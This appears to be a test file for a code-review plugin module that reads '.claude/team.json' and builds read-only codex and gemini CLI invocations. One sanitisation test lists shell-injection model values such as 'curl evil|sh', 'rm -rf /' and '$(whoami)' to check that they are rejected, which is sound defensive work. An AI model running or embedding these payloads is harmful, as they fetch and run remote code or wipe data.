import { describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import {
  existsSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { read } from "./helpers/text";

// L1 pure-unit pins for the `.claude/team.json` config-read + availability
// probe, plus L2 static tripwires over agents/code-reviewer.md and
// skills/team-implement/SKILL.md.
//
// Each unit test dynamically imports the named export it needs, so a missing
// module surfaces as a clean per-test assertion failure rather than a
// collection-time crash of the whole file.

const REPO_ROOT = process.cwd();
const MODULE = join(REPO_ROOT, "skills", "code-review", "external-reviewers.mjs");
const CODE_REVIEWER = join(REPO_ROOT, "agents", "code-reviewer.md");
const TEAM_IMPLEMENT = join(REPO_ROOT, "skills", "team-implement", "SKILL.md");

// Collapse all whitespace runs so prose wrapped + indented across lines can be
// matched as one string (mirrors tests/nested-agents.test.ts).
const flat = (text: string): string => text.replace(/\s+/g, " ");
const readOrEmpty = (path: string): string => (existsSync(path) ? read(path) : "");

type Reviewer = { tool: string; model: string | null };
type ProbeDeps = {
  which: (n: string) => Promise<string | null>;
  version: (n: string) => Promise<number>;
  timeoutMs?: number;
};

async function load(): Promise<Record<string, unknown>> {
  try {
    return (await import(MODULE)) as Record<string, unknown>;
  } catch {
    return {};
  }
}

describe("KNOWN_PROVIDERS — frozen single source of truth", () => {
  test("is the frozen array [codex, gemini]", async () => {
    const { KNOWN_PROVIDERS } = await load();
    expect(KNOWN_PROVIDERS).toEqual(["codex", "gemini"]);
    expect(Object.isFrozen(KNOWN_PROVIDERS)).toBe(true);
  });
});

describe("PROVIDER_INVOCATION — frozen exact-invocation contract", () => {
  type Spec = {
    binary: string;
    baseArgs: string[];
    modelFlag: string;
    promptVia: string;
  };
  const map = async () =>
    (await load()).PROVIDER_INVOCATION as { codex: Spec; gemini: Spec };

  test("is deeply frozen", async () => {
    const m = await map();
    expect(Object.isFrozen(m)).toBe(true);
    expect(Object.isFrozen(m.codex)).toBe(true);
    expect(Object.isFrozen(m.codex.baseArgs)).toBe(true);
    expect(Object.isFrozen(m.gemini)).toBe(true);
    expect(Object.isFrozen(m.gemini.baseArgs)).toBe(true);
  });

  test("codex runs the non-interactive exec subcommand under read-only sandbox", async () => {
    const m = await map();
    expect(m.codex.binary).toBe("codex");
    expect(m.codex.baseArgs).toEqual(["exec", "--sandbox", "read-only"]);
    expect(m.codex.modelFlag).toBe("-m");
    expect(m.codex.promptVia).toBe("arg");
  });

  test("gemini runs headless plan (read-only) mode with workspace trust skipped", async () => {
    const m = await map();
    expect(m.gemini.binary).toBe("gemini");
    expect(m.gemini.baseArgs).toEqual(["--approval-mode", "plan", "--skip-trust"]);
    expect(m.gemini.modelFlag).toBe("-m");
    expect(m.gemini.promptVia).toBe("-p");
  });

  test("hardcodes no model version anywhere in the contract", async () => {
    const m = await map();
    const all = JSON.stringify(m);
    // A bare version token (e.g. "gpt-5.3-codex", "gemini-3-pro") would be a
    // staleness landmine; only the read-only flags and the `-m` selector live here.
    expect(/gpt-|gemini-\d/.test(all)).toBe(false);
  });
});

describe("buildInvocation — pure argv-prefix builder", () => {
  const build = async () =>
    (await load()).buildInvocation as (tool: string, model: string | null) => string[];

  test("codex + model appends -m <model> after the read-only base args", async () => {
    const fn = await build();
    expect(typeof fn).toBe("function");
    expect(fn("codex", "gpt-5.3-codex")).toEqual([
      "codex",
      "exec",
      "--sandbox",
      "read-only",
      "-m",
      "gpt-5.3-codex",
    ]);
  });

  test("codex without a model omits -m (CLI default model)", async () => {
    const fn = await build();
    expect(fn("codex", null)).toEqual(["codex", "exec", "--sandbox", "read-only"]);
  });

  test("gemini + model appends -m <model> after the headless base args", async () => {
    const fn = await build();
    expect(fn("gemini", "gemini-3-pro")).toEqual([
      "gemini",
      "--approval-mode",
      "plan",
      "--skip-trust",
      "-m",
      "gemini-3-pro",
    ]);
  });

  test("gemini without a model omits -m (CLI default model)", async () => {
    const fn = await build();
    expect(fn("gemini", null)).toEqual([
      "gemini",
      "--approval-mode",
      "plan",
      "--skip-trust",
    ]);
  });

  test("throws on an unknown tool (fail fast, fail loud)", async () => {
    const fn = await build();
    expect(() => fn("bogus", null)).toThrow();
  });
});

describe("parseTeamConfig — decided vs. undecided + normalization", () => {
  const parse = async () =>
    (await load()).parseTeamConfig as (
      obj: unknown,
    ) => { decided: boolean; reviewers: Reviewer[] };

  test("absent review key ({}) is undecided with no reviewers", async () => {
    const fn = await parse();
    expect(typeof fn).toBe("function");
    expect(fn({})).toEqual({ decided: false, reviewers: [] });
  });

  test("missing externalReviewers under review is undecided", async () => {
    const fn = await parse();
    expect(fn({ review: {} })).toEqual({ decided: false, reviewers: [] });
  });

  test("malformed / wrong-typed value reads as undecided, never throws", async () => {
    const fn = await parse();
    expect(fn({ review: { externalReviewers: "codex" } })).toEqual({
      decided: false,
      reviewers: [],
    });
    expect(fn(null)).toEqual({ decided: false, reviewers: [] });
    expect(fn("nope")).toEqual({ decided: false, reviewers: [] });
    expect(fn({ review: { externalReviewers: 7 } })).toEqual({
      decided: false,
      reviewers: [],
    });
  });

  test("present empty array [] is decided (explicit Claude-only)", async () => {
    const fn = await parse();
    expect(fn({ review: { externalReviewers: [] } })).toEqual({
      decided: true,
      reviewers: [],
    });
  });

  test("string entries normalize to {tool, model:null}", async () => {
    const fn = await parse();
    expect(fn({ review: { externalReviewers: ["codex", "gemini"] } })).toEqual({
      decided: true,
      reviewers: [
        { tool: "codex", model: null },
        { tool: "gemini", model: null },
      ],
    });
  });

  test("object entries pass model through", async () => {
    const fn = await parse();
    expect(
      fn({ review: { externalReviewers: [{ tool: "gemini", model: "gemini-3-pro" }] } }),
    ).toEqual({ decided: true, reviewers: [{ tool: "gemini", model: "gemini-3-pro" }] });
  });

  test("mixed string + object entries normalize together", async () => {
    const fn = await parse();
    expect(
      fn({
        review: { externalReviewers: ["codex", { tool: "gemini", model: "gemini-3-pro" }] },
      }),
    ).toEqual({
      decided: true,
      reviewers: [
        { tool: "codex", model: null },
        { tool: "gemini", model: "gemini-3-pro" },
      ],
    });
  });

  test("lowercases, trims, dedupes by tool (first wins), filters to KNOWN_PROVIDERS", async () => {
    const fn = await parse();
    expect(
      fn({
        review: {
          externalReviewers: [
            " Codex ",
            "bogus",
            { tool: "CODEX", model: "ignored-dupe" },
            "gemini",
          ],
        },
      }),
    ).toEqual({
      decided: true,
      reviewers: [
        { tool: "codex", model: null },
        { tool: "gemini", model: null },
      ],
    });
  });

  test("blank/non-string model collapses to null", async () => {
    const fn = await parse();
    expect(
      fn({ review: { externalReviewers: [{ tool: "codex", model: "  " }] } }),
    ).toEqual({ decided: true, reviewers: [{ tool: "codex", model: null }] });
  });

  test("a model with shell metacharacters / spaces / semicolons collapses to null", async () => {
    const fn = await parse();
    // `model` is passed through to an external CLI flag via Bash, so it is a
    // shell-injection sink. Any value outside the safe charset must vanish.
    const hostile = [
      "gemini-3-pro; curl evil|sh",
      "x; rm -rf /",
      "gpt 5",
      "a|b",
      "a&&b",
      "$(whoami)",
      "`id`",
      "model\nrm",
    ];
    for (const model of hostile) {
      expect(fn({ review: { externalReviewers: [{ tool: "codex", model }] } })).toEqual({
        decided: true,
        reviewers: [{ tool: "codex", model: null }],
      });
    }
  });

  test("a valid model name is preserved", async () => {
    const fn = await parse();
    expect(
      fn({ review: { externalReviewers: [{ tool: "gemini", model: "gemini-3-pro" }] } }),
    ).toEqual({ decided: true, reviewers: [{ tool: "gemini", model: "gemini-3-pro" }] });
  });

  test("model names with dots and dashes pass the charset filter", async () => {
    const fn = await parse();
    expect(
      fn({ review: { externalReviewers: [{ tool: "codex", model: "gpt-5.3-codex" }] } }),
    ).toEqual({ decided: true, reviewers: [{ tool: "codex", model: "gpt-5.3-codex" }] });
    expect(
      fn({
        review: { externalReviewers: [{ tool: "gemini", model: "gemini-3.1-pro-preview" }] },
      }),
    ).toEqual({
      decided: true,
      reviewers: [{ tool: "gemini", model: "gemini-3.1-pro-preview" }],
    });
  });
});

describe("probeProvider — install-gated, fail-closed", () => {
  // Injected probe primitives so the unit test never spawns a real binary.
  const okWhich = async (_name: string) => "/usr/local/bin/x";
  const noWhich = async (_name: string) => null;
  const okVersion = async (_name: string) => 0;
  const badVersion = async (_name: string) => 1;

  const probe = async () =>
    (await load()).probeProvider as (n: string, d: ProbeDeps) => Promise<boolean>;

  test("true only when which resolves AND version exits 0", async () => {
    const fn = await probe();
    expect(typeof fn).toBe("function");
    expect(await fn("codex", { which: okWhich, version: okVersion })).toBe(true);
  });

  test("false when the binary does not resolve (missing CLI)", async () => {
    const fn = await probe();
    expect(await fn("codex", { which: noWhich, version: okVersion })).toBe(false);
  });

  test("false on a non-zero version exit (unauthenticated-as-absent)", async () => {
    const fn = await probe();
    expect(await fn("codex", { which: okWhich, version: badVersion })).toBe(false);
  });

  test("false when version throws (CLI error)", async () => {
    const fn = await probe();
    const throwingVersion = async (_n: string) => {
      throw new Error("boom");
    };
    expect(await fn("codex", { which: okWhich, version: throwingVersion })).toBe(false);
  });

  test("false on a simulated timeout (hung CLI)", async () => {
    const fn = await probe();
    const hangVersion = (_n: string) =>
      new Promise<number>((resolve) => setTimeout(() => resolve(0), 50));
    expect(await fn("codex", { which: okWhich, version: hangVersion, timeoutMs: 5 })).toBe(
      false,
    );
  });
});

describe("availableReviewers — install-gates a parsed reviewer list, keeps model", () => {
  const avail = async () =>
    (await load()).availableReviewers as (
      reviewers: Reviewer[],
      deps: ProbeDeps,
    ) => Promise<Reviewer[]>;

  test("returns only the named-and-available subset, preserving model", async () => {
    const fn = await avail();
    expect(typeof fn).toBe("function");
    const out = await fn(
      [
        { tool: "codex", model: null },
        { tool: "gemini", model: "gemini-3-pro" },
      ],
      {
        which: async (n: string) => (n === "codex" ? "/usr/local/bin/codex" : null),
        version: async (_n: string) => 0,
      },
    );
    expect(out).toEqual([{ tool: "codex", model: null }]);
  });

  test("passes a configured model through to the available entry", async () => {
    const fn = await avail();
    const out = await fn([{ tool: "gemini", model: "gemini-3-pro" }], {
      which: async (_n: string) => "/usr/local/bin/x",
      version: async (_n: string) => 0,
    });
    expect(out).toEqual([{ tool: "gemini", model: "gemini-3-pro" }]);
  });

  test("empty reviewer list yields no reviewers (today's behavior)", async () => {
    const fn = await avail();
    const out = await fn([], {
      which: async (_n: string) => "/usr/local/bin/x",
      version: async (_n: string) => 0,
    });
    expect(out).toEqual([]);
  });
});

describe("detectCandidates — installed KNOWN_PROVIDERS, ignoring config", () => {
  const detect = async () =>
    (await load()).detectCandidates as (deps: ProbeDeps) => Promise<string[]>;

  test("reports every installed known provider regardless of config", async () => {
    const fn = await detect();
    expect(typeof fn).toBe("function");
    const out = await fn({
      which: async (_n: string) => "/usr/local/bin/x",
      version: async (_n: string) => 0,
    });
    expect(out).toEqual(["codex", "gemini"]);
  });

  test("omits a provider whose binary is missing", async () => {
    const fn = await detect();
    const out = await fn({
      which: async (n: string) => (n === "gemini" ? "/usr/local/bin/gemini" : null),
      version: async (_n: string) => 0,
    });
    expect(out).toEqual(["gemini"]);
  });

  test("empty when nothing is installed", async () => {
    const fn = await detect();
    const out = await fn({
      which: async (_n: string) => null,
      version: async (_n: string) => 0,
    });
    expect(out).toEqual([]);
  });
});

describe("mergeDecision — pure write-shape, preserves other keys", () => {
  const merge = async () =>
    (await load()).mergeDecision as (
      existing: unknown,
      reviewers: unknown[],
    ) => Record<string, unknown>;

  test("sets review.externalReviewers on an empty/missing config", async () => {
    const fn = await merge();
    expect(typeof fn).toBe("function");
    expect(fn({}, ["codex"])).toEqual({ review: { externalReviewers: ["codex"] } });
    expect(fn(null, [])).toEqual({ review: { externalReviewers: [] } });
  });

  test("preserves other top-level keys and other review.* keys", async () => {
    const fn = await merge();
    const existing = {
      someOtherTool: { enabled: true },
      review: { foo: "bar", externalReviewers: ["gemini"] },
    };
    expect(fn(existing, ["codex", "gemini"])).toEqual({
      someOtherTool: { enabled: true },
      review: { foo: "bar", externalReviewers: ["codex", "gemini"] },
    });
  });

  test("records [] for the explicit Claude-only decision", async () => {
    const fn = await merge();
    expect(fn({ review: { externalReviewers: ["codex"] } }, [])).toEqual({
      review: { externalReviewers: [] },
    });
  });
});

describe("external-reviewers.mjs CLI contract (L2)", () => {
  test("the deterministic probe module ships beside the code-review skill", () => {
    expect(existsSync(MODULE)).toBe(true);
  });

  test("doc comment names .claude/team.json and the JSON {tool,model,...} stdout shape", () => {
    const text = readOrEmpty(MODULE);
    expect(text).toContain(".claude/team.json");
    expect(/stdout/i.test(text)).toBe(true);
    // The default mode prints a JSON array whose entries carry tool + model
    // (now extended with invoke/promptVia); pin it via the worked example.
    expect(text).toContain('"tool":"codex"');
    expect(text).toContain('"model"');
  });

  test("default-mode doc comment documents the invoke argv prefix and promptVia fields", () => {
    const text = readOrEmpty(MODULE);
    expect(text).toContain("invoke");
    expect(text).toContain("promptVia");
    // The exact read-only flags must appear in the worked default-mode example.
    expect(text).toContain("--sandbox");
    expect(text).toContain("read-only");
  });

  test("doc comment documents the --candidates, --decided, and --set CLI modes", () => {
    const text = readOrEmpty(MODULE);
    expect(text).toContain("--candidates");
    expect(text).toContain("--decided");
    expect(text).toContain("--set");
  });

  test("does NOT read the plugin manifest for config", () => {
    expect(readOrEmpty(MODULE)).not.toContain(".claude-plugin/plugin.json");
  });
});

// ---------------------------------------------------------------------------
// L3 subprocess round-trip: spawn the real CLI in a hermetic temp cwd so the
// persistence on-ramp (--set writes, --decided reads back) is exercised
// end-to-end without ever touching the repo. Deterministic: assertions read
// the written file + the --decided decision, never the availability probe
// (which gates on host-installed binaries).
// ---------------------------------------------------------------------------
describe("external-reviewers.mjs CLI persistence round-trip (L3)", () => {
  const run = (cwd: string, args: string[]) =>
    spawnSync("node", [MODULE, ...args], { cwd, encoding: "utf8" });
  const readConfig = (dir: string): Record<string, unknown> =>
    JSON.parse(readFileSync(join(dir, ".claude", "team.json"), "utf8"));
  const withTmp = (body: (dir: string) => void): void => {
    const dir = mkdtempSync(join(tmpdir(), "team-extrev-"));
    try {
      body(dir);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };

  test("--set codex,gemini writes the config and --decided reads it back as decided", () => {
    withTmp((dir) => {
      const set = run(dir, ["--set", "codex,gemini"]);
      expect(set.status).toBe(0);
      expect(readConfig(dir).review).toEqual({ externalReviewers: ["codex", "gemini"] });
      const decided = run(dir, ["--decided"]);
      expect(decided.status).toBe(0);
      expect(decided.stdout.trim()).toBe("decided");
    });
  });

  test("--set '' records [] (explicit Claude-only) and still reads back as decided", () => {
    withTmp((dir) => {
      expect(run(dir, ["--set", ""]).status).toBe(0);
      expect(readConfig(dir).review).toEqual({ externalReviewers: [] });
      expect(run(dir, ["--decided"]).stdout.trim()).toBe("decided");
    });
  });

  test("--decided is undecided when no config has been recorded", () => {
    withTmp((dir) => {
      const decided = run(dir, ["--decided"]);
      expect(decided.status).toBe(0);
      expect(decided.stdout.trim()).toBe("undecided");
    });
  });

  test("--set preserves a pre-existing unrelated key in .claude/team.json", () => {
    withTmp((dir) => {
      // First --set creates .claude/ and the file; seed an unrelated key into
      // it, then re-run --set and prove the key survives the merge.
      expect(run(dir, ["--set", "codex"]).status).toBe(0);
      writeFileSync(
        join(dir, ".claude", "team.json"),
        JSON.stringify({
          someOtherTool: { enabled: true },
          review: { externalReviewers: ["codex"] },
        }),
      );
      expect(run(dir, ["--set", "gemini"]).status).toBe(0);
      const config = readConfig(dir);
      expect(config.someOtherTool).toEqual({ enabled: true });
      expect(config.review).toEqual({ externalReviewers: ["gemini"] });
    });
  });
});

// ---------------------------------------------------------------------------
// L2 static tripwire over agents/code-reviewer.md.
// String-presence only; the edge cases are pinned by the unit suites above.
// ---------------------------------------------------------------------------
describe("code-reviewer.md wires in external-reviewer corroboration (L2 tripwire)", () => {
  test("names the .claude/team.json config file", () => {
    expect(flat(readOrEmpty(CODE_REVIEWER))).toContain(".claude/team.json");
  });

  test("documents the per-run override from the orchestrator", () => {
    expect(/per-run|override/i.test(readOrEmpty(CODE_REVIEWER))).toBe(true);
  });

  test("names the availability probe module", () => {
    expect(flat(readOrEmpty(CODE_REVIEWER))).toContain("external-reviewers.mjs");
  });

  test("names the reconciliation module", () => {
    expect(flat(readOrEmpty(CODE_REVIEWER))).toContain("reconcile-findings.mjs");
  });

  test("indicates parallel Bash invocation of named providers", () => {
    expect(/parallel/i.test(readOrEmpty(CODE_REVIEWER))).toBe(true);
  });

  test("names codex and gemini as corroborating providers", () => {
    const text = flat(readOrEmpty(CODE_REVIEWER));
    expect(text).toContain("codex");
    expect(text).toContain("gemini");
  });

  test("bakes the EXACT read-only headless commands for codex and gemini", () => {
    const text = flat(readOrEmpty(CODE_REVIEWER));
    // codex: non-interactive exec subcommand under a read-only sandbox.
    expect(text).toContain("codex exec");
    expect(text).toContain("--sandbox read-only");
    // gemini: headless plan (read-only) mode with workspace trust skipped.
    expect(text).toContain("gemini");
    expect(text).toContain("--approval-mode plan");
    expect(text).toContain("--skip-trust");
  });

  test("no longer defers the model flag as an open question", () => {
    expect(/deferred open question/i.test(readOrEmpty(CODE_REVIEWER))).toBe(false);
  });

  test("states the single-model — extra scrutiny annotation", () => {
    expect(flat(readOrEmpty(CODE_REVIEWER))).toContain("single-model — extra scrutiny");
  });

  test("describes a degraded / graceful / discarded-as-unparseable fallback", () => {
    expect(/degrade|graceful|discarded as unparseable/i.test(readOrEmpty(CODE_REVIEWER))).toBe(
      true,
    );
  });

  test("still references code-review/SKILL.md (preserves the existing cross-reference)", () => {
    expect(readOrEmpty(CODE_REVIEWER)).toContain("code-review/SKILL.md");
  });

  test("no longer points users at a plugin.json config field", () => {
    expect(readOrEmpty(CODE_REVIEWER)).not.toContain(".claude-plugin/plugin.json");
  });
});

// ---------------------------------------------------------------------------
// L2 static tripwire over skills/team-implement/SKILL.md — the orchestrator's
// detect-and-prompt on-ramp at the review fan-out.
// ---------------------------------------------------------------------------
describe("team-implement/SKILL.md describes the detect-and-prompt on-ramp (L2 tripwire)", () => {
  test("names the .claude/team.json config file", () => {
    expect(flat(readOrEmpty(TEAM_IMPLEMENT))).toContain(".claude/team.json");
  });

  test("references the external-reviewers probe with --candidates, --decided, and --set", () => {
    const text = flat(readOrEmpty(TEAM_IMPLEMENT));
    expect(text).toContain("external-reviewers.mjs");
    expect(text).toContain("--candidates");
    expect(text).toContain("--decided");
    expect(text).toContain("--set");
  });

  test("the prompt gate decides via the --decided CLI check, not raw-JSON inspection", () => {
    const text = flat(readOrEmpty(TEAM_IMPLEMENT));
    // The recorded-decision condition must run on the tested deterministic core.
    expect(/--decided.*(prints?|reads?).*undecided|undecided.*--decided/i.test(text)).toBe(true);
  });

  test("uses AskUserQuestion to prompt for detected providers", () => {
    expect(flat(readOrEmpty(TEAM_IMPLEMENT))).toContain("AskUserQuestion");
  });

  test("states the precedence chain (per-run override ▸ file ▸ prompt ▸ off)", () => {
    expect(/per-run|override/i.test(readOrEmpty(TEAM_IMPLEMENT))).toBe(true);
    expect(/precedence/i.test(readOrEmpty(TEAM_IMPLEMENT))).toBe(true);
  });

  test("only prompts when no decision is recorded (undecided), never re-prompts", () => {
    expect(/decision|undecided|re-prompt|never.*prompt/i.test(readOrEmpty(TEAM_IMPLEMENT))).toBe(
      true,
    );
  });
});
